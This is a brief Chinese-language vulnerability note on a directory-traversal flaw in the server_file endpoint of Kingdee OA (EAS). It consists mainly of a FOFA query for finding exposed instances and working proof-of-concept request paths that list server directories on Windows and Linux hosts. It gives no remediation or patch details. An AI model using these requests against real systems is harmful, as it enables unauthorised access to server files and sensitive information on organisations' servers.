# 金蝶OA server_file 目录遍历漏洞

## 漏洞描述

金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息

## 漏洞影响

> 金蝶OA

## FOFA

> [!NOTE]
>
> app="Kingdee-EAS"

## 漏洞复现

漏洞POC

```
/appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

```
Windows服务器

appmonitor/protected/selector/server_file/files?folder=C://&suffix=

Linux服务器
appmonitor/protected/selector/server_file/files?folder=/&suffix=
```